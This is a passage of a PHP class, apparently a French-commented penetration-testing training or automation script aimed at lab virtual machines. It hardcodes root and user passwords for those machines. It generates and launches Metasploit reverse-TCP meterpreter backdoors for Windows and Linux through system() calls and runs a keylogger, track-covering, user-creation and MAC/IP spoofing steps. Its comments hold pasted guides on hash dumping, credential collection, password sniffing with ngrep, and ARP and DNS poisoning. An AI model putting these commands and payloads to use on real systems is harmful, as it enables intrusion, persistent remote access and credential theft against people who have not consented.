    public function poc4root2rootkit4kerneland2kbeastv1(){
        $this->gtitre(__FUNCTION__);
        $eth = 'vmnet6';
        $domain = 'hack.vlan';
        $ip = "10.60.10.134"; // billu 1
        $port = "22";
        $protocol = "T";

        
        $login = "root" ;
        $pass = "roottoor";
        $titre = "";
        $fonction2exec = "";
        $vm = "";
        $this->poc4root($eth,$domain,$ip,$port,$protocol,$login,$pass,$titre,$fonction2exec,$vm);

    }
    
    
    public function poc4root2rootkit4kerneland2avgcoder(){
        $this->gtitre(__FUNCTION__);
        $eth = 'vmnet6';
        $domain = 'hack.vlan';
        $ip = "10.60.10.134"; // OWASP
        $port = "22";
        $protocol = "T";
        
        $login  = "root" ;
        $pass = "owaspbwa";
        $titre = "avgcoder";
        $fonction2exec = "root2rootkit";
        $vm = "";
        $this->poc4root($eth,$domain,$ip,$port,$protocol,$login,$pass,$titre,$fonction2exec,$vm);
    }
    
    
    public function poc4root2rootkit4kerneland2lkm(){
        $this->gtitre(__FUNCTION__);
        $eth = 'vmnet6';
        $domain = 'hack.vlan';
        $ip = "10.60.10.134"; // OWASP
        $port = "22";
        $protocol = "T";
        $user_name_created = "root" ;
        $user_name_pass = "owaspbwa";
        
        $login = "";
        $pass = "";
        $titre = "";
        $fonction2exec = "";
        $vm = "";
        $this->poc4root($eth,$domain,$ip,$port,$protocol,$login,$pass,$titre,$fonction2exec,$vm);

    }
    
    public function poc4pivot(){
        
        $eth = 'vmnet6';
        $domain = 'hack.vlan';
        $ip = "10.60.10.140"; // analoguepond
        $port = "22";
        $protocol = "T";
        $user_name_created = "eric" ;
        $user_name_pass = "therisingsun";

    }
    
    

    
    public function poc4root2backdoor(){
        $this->chapitre(__FUNCTION__);
                
        $eth = 'vmnet6';
        $domain = 'hack.vlan';
        $ip = "10.60.10.133"; // Lin.Security v1.0
        $port = "22";
        $protocol = "T";
      
        $login = "root" ;
        $pass = "secret123";
        $titre = "backdoor";
        $fonction2exec = "backdoor4root";
        $vm = "";
        $this->poc4root($eth,$domain,$ip,$port,$protocol,$login,$pass,$titre,$fonction2exec,$vm);       
    }
    
    
    
    
    public function poc4root8sudoers2file8exec2users2root8sudoers2nmap(){ // OK
        $this->titre(__FUNCTION__);
        $eth = 'vmnet6';
        $domain = 'hack.vlan';
        
        
        $ip = "10.60.10.143"; // DC-6
        $port = "22";
        $protocol = "T";
        $login = "graham" ;
        $pass = 'GSo7isUM1D4';
        
        
        $titre = "test";
        $fonction2exec = "users";
        $vm = "";
        $this->poc4root($eth,$domain,$ip,$port,$protocol,$login,$pass,$titre,$fonction2exec,$vm);
        
        
    }
    
        
    public function poc4root8test(){
        $this->titre(__FUNCTION__);        
        $eth = 'vmnet6';
        $domain = 'hack.vlan';

        
        $ip = "10.60.10.143"; // DC-6 
        $port = "22";
        $protocol = "T";
        $login = "graham" ;
        $pass = 'GSo7isUM1D4';
        

        $titre = "test";
        $fonction2exec = "users";
        $vm = "";
        $this->poc4root($eth,$domain,$ip,$port,$protocol,$login,$pass,$titre,$fonction2exec,$vm);
        
    
    }
    
    
    public function poc4lan4sniffing(){
        /*
         * tcptrace archivo.pcap
         * tcptrace -o3 -P captura3.pcap
         * tcptrace -o5 -r -l captura3.pcap
         *
         * net("https://www.virustotal.com/en/ip-address/199.217.115.62/information/");
         *
         * phishing -> in top news net("http://thehackernews.com/2014/03/malaysian-flight-mh370-tragedy-abused.html?utm_source=feedburner&utm_medium=feed&utm_campaign=Feed%3A+TheHackersNews+%28The+Hackers+News+-+Security+Blog%29");
         *
         * 3.6.26 The sameip Keyword
         * The sameip keyword is used to check if source and destination IP addresses are the same in an IP
         * packet. It has no arguments. Some people try to spoof IP packets to get information or attack a
         * server. The following rule can be used to detect these attempts.
         * alert ip any any -> 192.168.1.0/24 any (msg: "Same IP"; sameip;)
         *
         *
         * Faux serveurs DHCP
         * Cette attaque vient en complément de la première. Si un pirate a réussi à saturer un serveur DHCP par épuisement de
         * ressources, il peut très bien en activer un autre à la place. Ainsi il pourra ainsi contrôler tout le trafic réseau.
         *
         *
         *
         * scan arp -> identifier les mac /usr/share/ettercap/etter.fields
         * rsync -av -e "ssh -o MACs=hmac-ripemd160" --progress --partial user@remotehost://path/to/remote/stuff
         * traceroute: il envoit UDP et lorsque le ttl=0 la reponse est ICMP type 11 time exceed -> a la fin en recoit icmp type 3 (unreachable)-> wireshark
         * tcpreplay | bistreams -> duplique le traffic comme tee en sortie
         *
         *
         *
         *
         *
         *
         * tcpdump src host 10.100.20.100 and dst host 10.100.25.2 or dst host 10.100.25.1 and tcp and port 80
         * ngrep -d eth0 -i 'USER|PASS' tcp port 21 -> password
         * ipgrabe -i eth0 -> see partie paquets (Recherche d'informations précises (surtout chaine de caracteres) dans des trames)
         * tcpflow : Permet de visualiser en ASCII le contenu des paquets et de rassembler les sessions TCP sur disque.
         * nstreams -l wlan0 : show traffic protocols known
         * alert ip any any -> 192.168.1.0/24 any (content-list: "porn"; msg: "Porn word matched";)
         * alert ip any any -> 192.168.1.0/24 any (dsize: > 6000; msg: "Large size IP packet detected";)
         *
         * alert ip any any -> any any (ip_proto: ipip; msg: "IP-IP tunneling detected";)
         * alert tcp 192.168.1.0/24 any -> any 80 (msg: "Outgoing HTTP connection"; react: block;)
         *
         *
         *
         * using the IP Header Length field in order to elicit ICMP Parameter Problem error message back from the probed host:
         * How we determine the ACL (ICMP Protocol embedded inside)?
         * When the embedded protocol is ICMP, we send various ICMP message types encapsulated
         * inside IP datagrams with bad IP header(s). If we receive a reply from a Destination IP address we
         * have a host that is alive and an ACL, which allows this type of message of ICMP to get to the
         * host who generated the ICMP error message (and the Parameter Problem ICMP error message
         * is allowed from the destination host to the Internet).
         * If we are not getting any reply than one of three possibilities:
         * • The Filtering Device disallows datagrams with the kind of bad field we are using.
         * • The Filtering Device is filtering the type of the ICMP message we are using.
         * • The Filtering Device blocks ICMP Parameter Problem error messages initiated from the protected network destined to the Internet.
         *
         */
        
        $this->start("Man In The Middle Attack");
        
        // ######### MITM #############
        // dhcpStarvationAttack(); // not yet
        intro_mitm ();
        arpPoisoning (); // ok
        macFlooding (); // ok
        modif_flux ();
        dnsPoisoning (); // ok
        
        /*
         * iftop : dans la même veine que top, iftop sert à surveiller toutes les connexions réseau. Attention, iftop nécessite les privilèges root pour être lancé. Si vous n’êtes pas root, pensez à le faire précéder de sudo.
         * speedometer : un peu plus graphique que iftop, speedometer monitor le traffic de vos entrées/sorties, permet de surveiller la progression d’un téléchargement, de savoir combien de temps il faudra pour transférer tel fichier ou encore de connaître la vitesse d’écriture de votre système
         * netstat -nr pour la table de routage (revient au même que route),
         * netstat -i donne des statistiques sur les différentes interfaces réseau,
         * netstat -s personnellement je ne m'en sert que très rarement, mais c'est un résumé de toutes les stats réseaux, alors ça peut être utile de temps à autre,
         */
    }
    
    
    
    public function poc4lan2host4sys4enum(){
        // hide activities (process, repository, files ...etc)
        
        // Passive collect information utils sur le hosts (cpu fichier sensible, promiciouse mode ...etc)
        // * tcptraceroute mail.google.com 443
        
        // $ hostname --all-ip-addresses
        
        // Erase tracks
        // Erase tracks : debug metasploit run getcontermeasure On windows + Linux
        
        /*
         *
         * use post/linux/gather/hashdump
         * use post/linux/gather/enum_linux
         * use post/windows/manage/enable_rdp
         * use post/windows/gather/enum_logged_on_users
         *
         *
         *
         *
         *
         * Proxies allow you to reach around firewalls, or to obfuscate yourself so that your actions appear
         * to be coming from elsewhere. The Metasploit Framework has the ability to discover open HTTP
         * proxies and poorly configured reverse proxies on the network:
         * msf > use auxiliary/scanner/http/open_proxy
         * msf auxiliary(open_proxy) > set RHOSTS 192.168.1.0/24
         * msf auxiliary(open_proxy) > run
         *
         *
         *
         *
         *
         * Source Code and File Repositories
         * SVN
         * This is a common source code repository. It is free, open source, and easy to configure and
         * use. Clients for this repository are available for both Linux, Mac OSX, and Windows, and is
         * generally easily integrated with major IDE’s such as Visual Studio and X-Code.
         * msf > use auxiliary/scanner/http/svn_scanner
         * msf auxiliary(svn_scanner) > set RHOSTS 192.168.1.0/24
         * msf auxiliary(svn_scanner) > run
         *
         * WebDAV
         * Per Wikipedia, Web-based Distributed Authoring and Versioning (WebDAV) is a set of
         * methods based on the Hypertext Transfer Protocol (HTTP) that facilitates collaboration between
         * users in editing and managing documents and files stored on World Wide Web servers.
         * Many companies utilize WebDAV for file and information sharing across their company. This
         * can be a haven for information on how business is done within the company.
         * msf > use auxiliary/scanner/http/webdav_scanner
         * msf auxiliary(webdav_scanner) > set RHOSTS 192.168.1.0/24
         * msf auxiliary(webdav_scanner) > run
         *
         *
         * You may also run post modules directly from meterpreter:
         * meterpreter> run post/windows/gather/enum_applications
         * You may not get shell on a Windows box however. Many of Metasploit’s modules focus on
         * Windows, but all hope isn’t lost for Linux. To enumerate currently installed packages, for
         * instance:
         * msf > use post/linux/gather/enum_packages
         * msf post(enum_packages) > set SESSION 1
         * msf post(enum_packages) > run
         *
         *
         * List Drivers and Devices
         * Device drivers have security holes as well. PTES never mentions this but it can be very
         * handy when you can execute code via a driver bug in Ring 0. Look at post/windows/gather/
         * enum_devices. This module takes a very long time to run, it is recommended to run it as a
         * background job while you perform other tasks:
         * msf > use post/windows/gather/enum_devices
         * msf post(enum_devices) > set SESSION 1
         * msf post(enum_devices) > run
         * This will surely get you SYSTEM if you don’t have it already. This driver was installed on most
         * Dell laptops (and probably others) from 4-5 years ago:
         * msf > use exploit/windows/driver/broadcom_wifi_ssid
         * msf exploit(broadcom_wifi_ssid) > run
         *
         *
         * List Services
         * Services give you an idea of what is running on the computer that Task Manager isn’t telling
         * you about. Services can give a great deal of info on what the computer is used for and how you
         * should look into exploiting it further:
         * msf > use post/windows/gather/enum_services
         * msf post(enum_services) > set SESSION 1
         * msf post(enum_services) > run
         * For a Linux box, you would run:
         * msf > use post/linux/gather/enum_servicmsf post(enum_services) > set SESSION 1
         * msf post(enum_services) > run
         *
         *
         * List Shares
         * You may list two types of shares actually within Metasploit. Local ones, (F:, H:, Z:) and remote
         * (\\serverwiththepasswords):
         * msf > use post/windows/gather/enum_shares
         * msf post(enum_shares) > set SESSION 1
         * msf post(enum_shares) > run
         * To get a list of shares available on the network from the perspective of the victim, you may use
         * the netdiscovery module written by mubix.
         * msf > use post/windows/gather/netdiscovery
         * msf post(netdiscovery) > set SESSION 1
         * msf post(netdiscovery) > run
         *
         * Password and Credential Collection
         * PTES talks about getting IM client and web browser credentials, but why stop there? Metasploit
         * offers far more password (hash) dumping options. Outlook (every business uses outlook),
         * WinSCP, VNC, and a slew of others are easily dumped.
         * The hashdump modules for Windows and Linux dump the local users hashes from Metasploit.
         * Obviously, they use two different mechanisms for dumping the hashes. The Linux hashdump
         * must be run as root and will grab the information from /etc/passwd and /etc/shadow.
         * msf > use post/linux/gather/hashdump
         * msf post(hashdump) > set SESSION 1
         * msf post(hashdump) > run
         * The Windows hashdump is far more complicated, as it actually decrypts the hashes out of the
         * SAM file.
         * msf > use post/windows/gather/hashdump
         * msf post(hashdump) > set SESSION 1
         * msf post(hashdump) > run
         * Another option for credentials on the domain level is cachedump. It is Windows-only, and
         * extracts the stored domain hashes that have been cached as a result of a GPO setting. The
         * default setting on Windows is to store the last ten successful logins.
         * msf > use post/windows/gather/cachedump
         * msf post(cachedump) > set SESSION 1
         * msf post(cachedump) > run
         * A module that sort of melds cachedump and hashdump together is smart_hashdump. This will
         * dump local accounts from the SAM hive. If the target host is a Domain Controller, it will dump
         * 36
         * the Domain Account Database using the proper technique depending on privilege level, OS and
         * role of the host. This one is thanks to Carlos ‘Darkoperator’ Perez.
         * msf > use post/windows/gather/smart_hashdump
         * msf post(smart_hashdump) > set SESSION 1
         * msf post(smart_hashdump) > run
         *
         *
         * History/Logs
         * Linux
         * To be perfectly honest, the post-exploitation module-set for Linux hosts is really lacking. Part
         * of this could be due to the strength of the shell you get right out of the box on Linux hosts,
         * allowing you much more functionality out of your shell than, say, a Windows command prompt.
         * This shouldn’t be an excuse, however. For full integration with the framework, many functions
         * of the shell could easily be implemented as post modules and saved to the database for later
         * processing.
         * Post modules to collect files of interest such as ~/.bash_history, ~/.ssh/, known_hosts, .bashrc,
         * etc.. would be immensely useful if integrated into the framework via loot. In a later section, I
         * will supply resources to help bridge this gap in Metasploit. However, simply bridging this gap
         * with duct tape isn’t a very fruitful way of dealing with the problem. Techniques described in later
         * sections for bridging these gaps should be implemented within post modules if at all possible.
         * Integration with the framework is key to having a fluid, straight-forward idea of exploiting your
         * target later.
         * Windows
         * No Windows post modules allow for the dumping of event history or past commands. Part of
         * 37
         * this is due to lack of inherent functionality within Windows itself. Windows does not save past
         * commands across shell sessions like Linux does. If you happen across an open prompt, you
         * may use the ‘doskey /history’ command to view past commands in that prompt session, but that is
         * as close as you will get.
         * There are options, however, to bridge this gap. See dumpel.exe on this page:
         * http://support.microsoft.com/kb/927229
         * A good thing about the executables above is that AV won’t detect these as malware. They are
         * typical systems administrator utilities (put out by Microsoft no less). Dumping the event logs into
         * loot would be an excellent endeavour for a post module.
         *
         */
        
        
        $this->article("Enum", "
		post/linux/gather/enum_configs                                                    normal  Linux Gather Configurations
		post/linux/gather/enum_network                                                    normal  Linux Gather Network Information
		post/linux/gather/enum_protections                                                normal  Linux Gather Protection Enumeration
		post/linux/gather/enum_system                                                     normal  Linux Gather System and User Information
		post/linux/gather/enum_users_history                                              normal  Linux Gather User History
		post/windows/gather/enum_ad_computers                                             normal  Windows Gather AD Enumerate Computers
		post/windows/gather/enum_applications                                             normal  Windows Gather Installed Application Enumeration
		post/windows/gather/enum_artifacts                                                normal  Windows Gather File and Registry Artifacts Enumeration
		post/windows/gather/enum_chrome                                                   normal  Windows Gather Google Chrome User Data Enumeration
		post/windows/gather/enum_computers                                                normal  Windows Gather Enumerate Computers
		post/windows/gather/enum_db                                                       normal  Windows Gather Database Instance Enumeration
		post/windows/gather/enum_devices                                                  normal  Windows Gather Hardware Enumeration
		post/windows/gather/enum_dirperms                                                 normal  Windows Gather Directory Permissions Enumeration
		post/windows/gather/enum_domain                                                   normal  Windows Gather Enumerate Domain
		post/windows/gather/enum_domain_group_users                                       normal  Windows Gather Enumerate Domain Group
		post/windows/gather/enum_domain_tokens                                            normal  Windows Gather Enumerate Domain Tokens
		post/windows/gather/enum_domains                                                  normal  Windows Gather Domain Enumeration
		post/windows/gather/enum_files                                                    normal  Windows Gather Generic File Collection
		post/windows/gather/enum_hostfile                                                 normal  Windows Gather Windows Host File Enumeration
		post/windows/gather/enum_ie                                                       normal  Windows Gather Internet Explorer User Data Enumeration
		post/windows/gather/enum_logged_on_users                                          normal  Windows Gather Logged On User Enumeration (Registry)
		post/windows/gather/enum_ms_product_keys                                          normal  Windows Gather Product Key
		post/windows/gather/enum_powershell_env                                           normal  Windows Gather Powershell Environment Setting Enumeration
		post/windows/gather/enum_prefetch                                                 normal  Windows Gather Prefetch File Information
		post/windows/gather/enum_proxy                                                    normal  Windows Gather Proxy Setting
		post/windows/gather/enum_services                                                 normal  Windows Gather Service Info Enumeration
		post/windows/gather/enum_shares                                                   normal  Windows Gather SMB Share Enumeration via Registry
		post/windows/gather/enum_snmp                                                     normal  Windows Gather SNMP Settings Enumeration (Registry)
		post/windows/gather/enum_termserv                                                 normal  Windows Gather Terminal Server Client Connection Information Dumper
		post/windows/gather/enum_tokens                                                   normal  Windows Gather Enumerate Domain Admin Tokens (Token Hunter)
		post/windows/gather/enum_tomcat                                                   normal  Windows Gather Tomcat Server Enumeration
		post/windows/gather/enum_unattend                                                 normal  Windows Gather Unattended Answer File Enumeration
		post/windows/gather/forensics/enum_drives                                         normal  Windows Gather Physical Drives and Logical Volumes
		post/windows/gather/forensics/recovery_files                                      normal  Windows Gather Deleted Files Enumeration and Recovering
		post/windows/gather/local_admin_search_enum                                       normal  Windows Gather Local Admin Search
		post/windows/gather/usb_history                                                   normal  Windows Gather USB Drive History
		post/windows/gather/win_privs                                                     normal  Windows Gather Privileges Enumeration");
        
        // ############ POST Exploitation ###########
        $this->article("Do this", "Need later for xplico");
        $this->cmd("localhost", "echo '$this->root_passwd' | sudo -S tcpdump -s 0 -i eth0 -w $this->dir_tmp/hack.vlan.pcap");
        $this->pause();
        $this->titre("After gain root Acces");
        $this->ssTitre("Creation de backdoor TCP avec MSF MODE Reverse pour cible Linux");
        $this->cmd("localhost", "echo '$this->root_passwd' | sudo -S msfpayload windows/meterpreter/reverse_tcp LHOST=$this->prof LPORT=3333 x > $this->dir_tmp/backdoor_win_reverse.exe");
        $this->cmd("meterpreter>", "run prefetchtool --x 10");
        $this->article("prefetchtool", "permet d’avoir les 10 programmes les plus utilisés (un bon début poursavoir à quoi sert essentiellement le poste cible et  pour chercher ou  placer notre Backdoor).");
        $this->cmd("meterpreter>", "run get_application_list");
        $this->cmd("meterpreter>", "run scrapper");
        $this->article("scrapper", "permet de récupérer d’importer sur notre poste tout un tas d’informations sur la cible (notamment le registre, hash, utilisateurs, système infos…).");
        $this->cmd("meterpreter>", "run keylogrecorder");
        $this->cmd("meterpreter>", "run getcontermeasure");
        $this->article("getcontermeasure", "cover track");
        $this->cmd("meterpreter>", "run idletime");
        $this->article("idletime", "voir depuis combien de temps l’utilisateur est inactif.");
        $this->cmd("meterpreter>", "run getgui -u victime -p victime");
        $this->article("getgui", "add user");
        $this->article("linux", "useradd -m -d /home/student2 -c \"Hacked Unreal\" -s /bin/bash student2");
        $this->article("windows", "later");
        $this->pause();
        
        $this->ssTitre("Windows");
        $query = "echo \"db_status\nuse exploit/multi/handler\nset payload windows/meterpreter/reverse_tcp\nset LHOST \"$this->prof\"\nset LPORT 3333\nrun\nexit\n \" > $this->dir_tmp/windows_gather.rc";
        system($query);
        $this->requette("cat $this->dir_tmp/windows_gather.rc");
        $this->cmd("localhost", "echo '$this->root_passwd' | sudo -S msfconsole -q -r $this->dir_tmp/windows_gather.rc -y /opt/metasploit/apps/pro/ui/config/database.yml");
        $this->pause();
        $this->ssTitre("Linux");
        $this->cmd("localhost", "echo '$this->root_passwd' | sudo -S msfpayload linux/x86/meterpreter/reverse_tcp LHOST=$this->prof LPORT=2222 x > $this->dir_tmp/backdoor_linux_reverse");
        $query = "echo \"db_status\nuse exploit/multi/handler\nset payload linux/x86/meterpreter/reverse_tcp\nset LHOST \"$this->prof\"\nset LPORT 2222\nrun\nexit\n \" > $this->dir_tmp/linux_gather.rc";
        system($query);
        $this->requette("cat $this->dir_tmp/linux_gather.rc");
        $this->cmd("localhost", "echo '$this->root_passwd' | sudo -S msfconsole -q -r $this->dir_tmp/linux_gather.rc -y /opt/metasploit/apps/pro/ui/config/database.yml");
        $this->pause();
        
        $this->titre("Find our Interface");
        $this->requette("echo '$this->root_passwd' | sudo -S nmap --iflist ");
        $this->cmd("localhost", "echo '$this->root_passwd' | sudo -S netstat -r ");
        $this->cmd("localhost", "echo '$this->root_passwd' | sudo -S route");
        $this->cmd("localhost", "ifconfig ");
        $this->pause();
        
        $this->ssTitre("Scan ARP");
        $this->net("http://nmap.org/book/nping-man-arp-mode.html");
        $this->cmd("localhost", "echo '$this->root_passwd' | sudo -S wireshark -i $this->eth_lan -k");
        $this->pause();
        $this->requette("echo '$this->root_passwd' | sudo -S arp -av -i $this->eth_lan");
        // In previous releases of Nmap, -sn was known as -sP.
        $this->requette("echo '$this->root_passwd' | sudo -S nmap -sn -n --reason 10.50.10.0/24 -e $this->eth_lan ");
        $this->requette("echo '$this->root_passwd' | sudo -S arp -av -i $this->eth_lan");
        $this->pause();
        $this->ssTitre("Bypass ACL protection");
        $this->img("lan/Mac_Spoofing.png");
        $this->pause();
        $this->ssTitre("Spoofing MAC & IP Mode Promiscuous");
        $this->requette("echo '$this->root_passwd' | sudo -S nmap -sn -n --reason 10.50.10.0/24 --spoof-mac=11:22:33:44:55:66 -S 10.50.10.100 -e $this->eth_lan -oX $this->dir_tmp/ip_lan_victime");
        $this->pause();
        $this->ssTitre("Detect Host Firewalled");
        $this->requette("echo '$this->root_passwd' | sudo -S nmap -sA --reason -n --top-ports 5 -f $this->xp $this->msf $this->fw $this->lts $this->win7 $win08 -e $this->eth_lan");
        $this->pause();
        $this->ssTitre("Scan Ports Furtif");
        $this->requette("echo '$this->root_passwd' | sudo -S nmap -n -Pn --top-ports 2000 --open -sI $this->xp $this->msf -e $this->eth_lan");
        $this->pause();
        
        // ####### enum LAN Network ###
        rpc ();
        netbios ();
        snmp ();
        
        // ###########################
        $this->ssTitre("Mapping LAN");
        $this->net("https://github.com/rflynn/lanmap2");
        $this->cmd("localhost", "cd /opt/lanmap2-master/src/;sudo ./cap");
        $this->cmd("localhost", "cd graph && ./graph.sh && cd -");
        $this->ssTitre("View");
        $this->cmd("localhost", "eog /opt/lanmap2-master/graph/net.png");
        $this->pause();
        
    }
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
}
?>